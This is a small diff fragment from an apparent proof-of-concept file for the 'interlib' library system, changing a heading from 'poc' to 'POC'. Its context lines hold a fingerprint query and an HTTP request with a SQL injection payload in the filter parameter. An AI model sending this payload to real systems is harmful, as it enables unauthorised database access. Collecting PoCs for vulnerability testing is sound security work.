@@ -7,7 +7,7 @@
 body="interlib"
 ```
 
-## poc
+## POC
 ```
 GET /interlib/websearch/WebBookNew?cmdACT=search_BookNew&showpage=1&filter=''+or+1=1--+ HTTP/1.1
 Host: {{Hostname}}
